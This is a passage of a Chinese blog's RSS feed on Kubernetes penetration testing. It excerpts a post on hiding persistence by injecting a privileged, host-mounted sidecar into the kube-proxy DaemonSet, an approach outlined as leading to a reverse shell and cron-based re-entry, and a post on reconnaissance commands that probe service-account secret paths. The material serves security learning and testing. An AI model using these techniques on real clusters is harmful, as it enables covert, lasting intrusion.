<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>K8s安全 on My Hugo Knowledgebase</title>
    <link>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/</link>
    <description>Recent content in K8s安全 on My Hugo Knowledgebase</description>
    <generator>Hugo</generator>
    <language>zh-CN</language>
    <lastBuildDate>Wed, 01 Jan 2025 00:00:00 +0800</lastBuildDate>
    <atom:link href="http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>k8s权限维持-动态容器注入</title>
      <link>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Wed, 01 Jan 2025 00:00:00 +0800</pubDate>
      <guid>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8%E6%B3%A8%E5%85%A5/</guid>
      <description>&lt;h1 id=&#34;动态容器注入-一种隐蔽的k8s权限维持方法&#34;&gt;动态容器注入-一种隐蔽的k8s权限维持方法&lt;/h1&gt;&#xA;&lt;p&gt;恶意pod-&amp;gt;反弹shell-&amp;gt;挂载宿主机(node)/-&amp;gt;cron写定时任务反弹shell-&amp;gt;master-node&lt;/p&gt;&#xA;&lt;p&gt;k8s控制器&lt;/p&gt;&#xA;&lt;p&gt;众所周知，k8s的持久化有很多方法：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;部署后门pod&lt;/li&gt;&#xA;&lt;li&gt;部署cronjob&lt;/li&gt;&#xA;&lt;li&gt;部署shadowApiserver&lt;/li&gt;&#xA;&lt;li&gt;部署恶意deployment&lt;/li&gt;&#xA;&lt;li&gt;部署恶意deamonset&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;这些方法大家想必都很熟悉了，而这些方法都需要我们额外创建新的pod或者k8s控制器，k8s中多出来一些pod和控制器很容易就被发现了，有没有什么能够利用原有控制器和pod的办法呢？&lt;/p&gt;&#xA;&lt;p&gt;这里就有一种叫做动态容器注入的方式&lt;/p&gt;&#xA;&lt;p&gt;目前来说的注入方式有两种，一种是将一个sidecar容器注入到原有pod中，一种是将存活探针注入到原有pod中&lt;/p&gt;&#xA;&lt;h2 id=&#34;利用sidecar容器技术进行注入&#34;&gt;利用sidecar容器技术进行注入&lt;/h2&gt;&#xA;&lt;p&gt;这里提到一个技术叫sidecar，简单理解就是在同一个 Pod 里额外放一只容器，为主业务容器提供增强能力，生命周期与主容器完全一致（同启、同停、同网络、同存储卷）。具体技术用途可以在官方文档了解：https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/&lt;/p&gt;&#xA;&lt;p&gt;这里可以利用k8s控制器，像daemonset这类，我们可以更改它yaml的spec.template的内容，并replace触发其更新，这样就能实现在原容器上增加一个恶意的sidecar容器，而不用增加一个新的控制器或独立pod&lt;/p&gt;&#xA;&lt;p&gt;为什么选择daemonset：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;它能够确保所有节点（包括新增节点）上都运行一个Pod&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;如果有Pod退出，DaemonSet将在对应节点上自动重建一个Pod&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;值得一题的是，我们注入的恶意容器需要怎么配置比较好呢，思路可以从去除容器与宿主机隔离的角度出发：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;容器是特权的（相当于docker run的时候带了–privileged选项）&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;容器与宿主机共享网络和PID命名空间（打破命名空间隔离）&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;容器内挂载宿主机根目录（打破文件系统隔离）&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;这样一来，我们获得sidecar容器的shell实际上和节点的shell区别就不大了&lt;/p&gt;&#xA;&lt;h3 id=&#34;基础注入&#34;&gt;基础注入&lt;/h3&gt;&#xA;&lt;p&gt;一般来说，我们会考虑对kube-system命名空间中已运行的daemonset进行注入，常用的是k8s中的kube-proxy，比如接下来这个例子：&lt;/p&gt;&#xA;&lt;p&gt;我们探测一下是否存在kube-proxy：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl get daemonset -n kube-system&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759568770178.png&#34; alt=&#34;QQ_1759568770178&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们也可以看到这个daemonset控制的pod：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759569016043.png&#34; alt=&#34;QQ_1759569016043&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来我们来读这个daemonset的yaml：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl get daemonset -n kube-system -o yaml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759569170555.png&#34; alt=&#34;QQ_1759569170555&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们可以在这个yaml基础上进行修改实现注入：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;我们先分析原yaml的spec：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;revisionHistoryLimit&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;selector&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;matchLabels&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;k8s-app&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kube-proxy&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;template&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;creationTimestamp&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;k8s-app&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kube-proxy&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;containers&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        - &lt;span style=&#34;color:#f92672&#34;&gt;command&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          - &lt;span style=&#34;color:#ae81ff&#34;&gt;/usr/local/bin/kube-proxy&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          - --&lt;span style=&#34;color:#ae81ff&#34;&gt;config=/var/lib/kube-proxy/config.conf&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          - --&lt;span style=&#34;color:#ae81ff&#34;&gt;hostname-override=$(NODE_NAME)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;env&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          - &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;NODE_NAME&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;valueFrom&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#f92672&#34;&gt;fieldRef&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;fieldPath&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;spec.nodeName&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;registry.k8s.io/kube-proxy:v1.30.14&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;imagePullPolicy&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;IfNotPresent&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kube-proxy&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;resources&lt;/span&gt;: {}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;securityContext&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;privileged&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;terminationMessagePath&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;/dev/termination-log&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;terminationMessagePolicy&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;File&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;volumeMounts&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          - &lt;span style=&#34;color:#f92672&#34;&gt;mountPath&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;/var/lib/kube-proxy&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kube-proxy&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          - &lt;span style=&#34;color:#f92672&#34;&gt;mountPath&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;/run/xtables.lock&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;xtables-lock&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          - &lt;span style=&#34;color:#f92672&#34;&gt;mountPath&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;/lib/modules&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;lib-modules&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;readOnly&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;dnsPolicy&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ClusterFirst&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;hostNetwork&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;nodeSelector&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;kubernetes.io/os&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;linux&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;priorityClassName&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;system-node-critical&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;restartPolicy&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Always&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;schedulerName&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;default-scheduler&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;securityContext&lt;/span&gt;: {}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;serviceAccount&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kube-proxy&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;serviceAccountName&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kube-proxy&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;terminationGracePeriodSeconds&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;tolerations&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        - &lt;span style=&#34;color:#f92672&#34;&gt;operator&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Exists&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        - &lt;span style=&#34;color:#f92672&#34;&gt;configMap&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;defaultMode&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;420&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kube-proxy&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kube-proxy&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        - &lt;span style=&#34;color:#f92672&#34;&gt;hostPath&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;path&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;/run/xtables.lock&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;type&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;FileOrCreate&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;xtables-lock&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        - &lt;span style=&#34;color:#f92672&#34;&gt;hostPath&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;path&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;/lib/modules&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;type&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;lib-modules&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;updateStrategy&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;rollingUpdate&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;maxSurge&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;maxUnavailable&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;type&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;RollingUpdate&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们只需要在此基础上增加两个新对象：&lt;/p&gt;</description>
    </item>
    <item>
      <title>K8s渗透-信息搜集</title>
      <link>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</link>
      <pubDate>Wed, 01 Jan 2025 00:00:00 +0800</pubDate>
      <guid>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</guid>
      <description>&lt;h1 id=&#34;k8s渗透-信息搜集&#34;&gt;K8s渗透-信息搜集&lt;/h1&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;文章首发于track安全社区：&lt;a href=&#34;https://bbs.zkaq.cn/t/32483.html&#34;&gt;K8s渗透入门从零到一&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;这一步发生在内网信息搜集的过程中，内网一般不会完全基于容器技术构建，所以内网搜集的起点一般可以分为权限受限的主机和物理主机内网&lt;/p&gt;&#xA;&lt;p&gt;k8s内部集群网络主要依靠网络插件，目前使用比较多的是Flannel和Calico&lt;/p&gt;&#xA;&lt;p&gt;而通信类型存在4种：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;同一pod内的容器间通信&lt;/li&gt;&#xA;&lt;li&gt;不同pod间的通信&lt;/li&gt;&#xA;&lt;li&gt;pod与service间的通信&lt;/li&gt;&#xA;&lt;li&gt;集群外部的流量与service间的通信&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;shell环境辨别&#34;&gt;shell环境辨别&lt;/h2&gt;&#xA;&lt;p&gt;如果我们的起点是一个在k8s集群内部权限受限的容器，那么内网探测的过程依然遵循常规内网探测，可以先在搜集的时候判断当前是否是云环境，可以参考我的笔记：&lt;a href=&#34;https://www.cnblogs.com/yuy0ung/articles/18220591&#34;&gt;快速识别虚拟主机、Docker和K8s集群环境&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;一些常用命令：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ps aux&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ls -l .dockerenv&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;capsh --print&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;env | grep KUBE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ls -l /run/secrets/kubernetes.io/&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mount&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;df -h&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /proc/1/cgroup&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /etc/resolv.conf&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /etc/mtab&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /proc/self/status&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /proc/self/mounts&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /proc/net/unix&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /proc/1/mountinfo&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里的&lt;code&gt;cat /proc/1/cgroup&lt;/code&gt;是分辨容器环境一个很实用的命令：&lt;/p&gt;&#xA;&lt;p&gt;没使用 Kubernetes 的 docker 容器，其 cgroup 信息格式如下：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;12:hugetlb:/docker/9df9278580c5fc365cb5b5ee9430acc846cf6e3207df1b02b9e35dec85e86c36&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而k8s默认的cgroup信息格式如下：&lt;/p&gt;&#xA;&lt;pre 